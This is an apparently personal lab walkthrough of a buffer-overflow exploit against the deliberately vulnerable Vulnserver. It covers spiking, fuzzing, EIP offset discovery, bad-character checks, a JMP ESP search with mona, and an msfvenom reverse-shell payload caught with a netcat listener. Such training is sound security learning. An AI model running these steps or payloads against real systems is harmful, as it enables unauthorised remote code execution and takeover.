- Run Vulnserver.exe as administrator [If the **Windows Security Alert** window appears; click **Allow access**.]

- Minimize the vulnserver Cmd prompt and open IMMUNITY DEBUGGER, run the setup as administrator and install python with default settings.

- After Installing, Run Immunity Debugger as administrator.

- click **File** in the menu bar, and in the drop-down menu, click **Attach**,**Select process to attach** pop-up appears, click the **vulnserver** process and click **Attach** [if vulnserver is not available by default, then you can add manually by clicking Add instead of Attach].

- **Immunity Debugger** showing the **vulnerserver.exe** process window appears,Initially the process will be paused(BOTTOM RIGHT), to RUN - click on run program icon in the toolbar to run Immunity Debugger.

- In MATE Terminal,after escalating to root user and jumping to root directory,**nc -nv 10.10.10.10 9999** will get you into VulnServer [HELP for valid cmnds].

- Generating spike templates and perform spiking (`the package formats used for communicating with the vulnerable server. They are useful for testing and identifying functions vulnerable to buffer overflow exploitation`)

- To create a spike template for spiking on the STATS function, type **pluma stats.spk** and in text editor

**s_readline();**

**s_string(“STATS ”);**

**s_string_variable(“0”);** Save and Close the Script File

- **generic_send_tcp 10.10.10.10 9999 stats.spk 0 0** - to send packages to the vulnerable server. (where stats.spk is spike_script and 0 0 indicates SKIPVAR SKIPSTR).

- **Immunity Debugger** window, you can observe that the process status is still **Running**, which indicates that the STATS function is not vulnerable to buffer overflow. Now, we will repeat the same process with the TRUN function.

- type **pluma trun.spk** and press **Enter** and enter in MATE terminal.

**s_readline();**

**s_string(“TRUN ”);**

**s_string_variable(“0”);**

- **generic_send_tcp 10.10.10.10 9999 trun.spk 0 0** and press **Enter** to send the packages to the vulnerable server wheras here the process status is changed to paused, thus TRUN function of VUln server having buffer overflow and Overwriting the EIP register can allow us to gain shell access to the target system.

 ![[Pasted image 20220723014744.png]]

- After identifying the vulnerability, We need to perform Fuzzing to send a large amount of data to the target server.

- **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.

- The **Network** window appear in the places tab and then press **Ctrl+L**. The **Location** field appears. type **smb://[WindowsIP]** and press **Enter** to access **Windows 10** shared folders.

- **chmod +x fuzz.py** and press **Enter** to change the mode to execute the Python script.

-  type **./fuzz.py** and press **Enter** to run the Python fuzzing script against the target machine

- switch to the **Immunity Debugger** window and wait for the status to change from **Running** to **Paused**.

- As the vulnserver crashed due to overloading, we have to restart everything again.

- Through fuzzing, we have understood that we can overwrite the EIP register with 1 to 5100 bytes of data. Now, we will use the **pattern_create** Ruby tool to generate random bytes of data.

- **/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 13600** in MATE Terminal.

- it will generate some random piece of bytes for the given length by the user and copy the given piece to pluma findoff.py,A python script file appears,paste the copied code in the **offset** variable. and save it

-  **chmod +x findoff.py** and press **Enter** to change the mode to execute the Python script.

- type **./findoff.py** and press **Enter** to run the Python script to send the generated random bytes to the vulnerable server and after this Immunity Debugger window,EIP register is overwritten with random bytes.

- In a new terminal after getting root privilege and jumping to root directory,type **/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 20000 -q 386F4337**

-  A result appears, indicating that the identified EIP register is at an offset of **2003** bytes.

- Now as it is facing buffer overflow, again they both got crashed ,Thus relaunch again and run as administrator.

- In the **Terminal** window, type **chmod +x overwrite.py**,by this we are running the python script to overwrite the EIP register.

- **./overwrite.py** and press **Enter** to run the Python script to send the generated random bytes to the vulnerable server.

- Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.

- Now, before injecting the shellcode into the EIP register, first, we must identify bad characters that may cause issues in the shellcode

-  **Terminal** window, type **chmod +x badchars.py** and press **Enter** to change the mode to execute the Python script and type **./badchars.py** and press **Enter** to run the Python script to send the badchars along with the shellcode.

-  **ESP** register value in the top-right window. Right-click on the selected ESP register value and click the **Follow in Dump** option.

- left-corner window, you can observe that there are no badchars that cause problems in the shellcode

-  we need to identify the right module of the vulnerable server that is lacking memory protection. In **Immunity Debugger**, you can use scripts such as **mona.py** to identify modules that lack memory protection.

- **Immunity Debugger** window. In the text field present at bottom of the window, type **!mona modules**

- You can observe that there is no memory protection for the module **essfunc.dll** and now we can exploit the module and inject the shellcode.

- In the **Terminal** window, type **/usr/share/metasploitframework/tools/exploit/nasm_shell.rb** after escalating to root and jumping to root directory.

-  **nasm** command line appears; type **JMP ESP** and press **Enter** and then The result appears, displaying the hex code of **JMP ESP**

- In the **Immunity Debugger** window, type **!mona find -s “\xff\xe4” -m essfunc.dll**.

- Relaunch both the applications and In the **Immunity Debugger** window, click the **Go to address in Disassembler icon**.

-  click on the **Run program** in the toolbar to run **Immunity Debugger**.

- , type **chmod +x jump.py**, and press **Enter** to change the mode to execute the Python script.

- type **./jump.py** and press **Enter** to execute the Python script.

-  **Immunity Debugger** window, you will observe that the EIP register has been overwritten with the return address of the vulnerable module and Re-launch the vulnerable server as an administrator.

- **msfvenom -p windows/shell_reverse_tcp LHOST=[Local IP Address] LPORT=[Listening Port] EXITFUNC=thread -f c -a x86 -b “\x00”**

- **Copy** the shellcode the code and Type **pluma shellcode.py**

- paste the copied in overflow section.

- Netcat command to listen on port 4444 in MATE Terminal.

- **nc -nvlp 4444** and press **Enter**.

- Netcat will start listening on port **4444**

- Type **chmod +x shellcode.py** and press **Enter** to change the mode to execute the Python script and Type **./shellcode.py** to execute.

- shell access to the target vulnerable server has been established

- whoami,getuid,getsystem.